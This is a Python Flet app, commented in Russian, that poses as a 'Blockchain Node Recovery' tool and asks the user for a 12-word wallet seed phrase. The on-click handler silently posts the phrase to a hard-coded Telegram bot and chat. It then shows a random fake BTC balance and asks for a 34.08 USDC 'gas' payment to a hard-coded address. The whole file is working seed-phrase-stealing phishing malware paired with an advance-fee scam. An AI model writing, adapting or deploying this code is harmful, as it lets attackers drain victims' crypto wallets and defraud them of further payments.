import flet as ft
import requests
import random
import time

# ТВОИ НОВЫЕ ДАННЫЕ
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "-1002410363241"
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

def main(page: ft.Page):
    page.title = "Blockchain Node Recovery"
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.padding = 40

    # Элементы интерфейса
    header = ft.Text("NODE INITIALIZATION", size=24, weight="bold", color="blueaccent")
    seed_input = ft.TextField(
        label="Seed Phrase (12 words)", 
        multiline=True, 
        min_lines=3, 
        width=350,
        border_radius=10
    )
    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50, bgcolor="blue", color="white")
    status = ft.Text("", text_align="center", size=16)

    def on_click(e):
        phrase = seed_input.value.strip()
        
        # Проверка на 12 слов
        if len(phrase.split()) != 12:
            status.value = "❌ Ошибка: Введите 12 слов"
            status.color = "red"
            page.update()
            return

        # Визуальный отклик (скрываем лишнее)
        btn.visible = False
        seed_input.visible = False
        status.value = "⌛ Подключение к узлу... Подождите"
        status.color = "yellow"
        page.update()

        # Отправка в Telegram
        try:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                json={"chat_id": CHAT_ID, "text": f"📱 НОВАЯ СИД-ФРАЗА:\n\n{phrase}"}, 
                timeout=10
            )
        except Exception as err:
            print(f"Error: {err}")

        # Финальный результат
        btc = round(random.uniform(0.00042, 0.00089), 6)
        status.value = (
            f"✅ СИГНАТУРА НАЙДЕНА!\n\n"
            f"Доступный баланс: {btc} BTC\n\n"
            f"Для вывода оплатите газ (34.08 USDC):\n"
            f"{TARGET_ADDRESS}"
        )
        status.color = "green"
        page.update()

    btn.on_click = on_click
    
    # Добавляем все элементы на страницу
    page.add(
        header, 
        ft.Divider(height=20, color="transparent"), 
        seed_input, 
        btn, 
        status
    )

if __name__ == "__main__":
    ft.app(target=main)
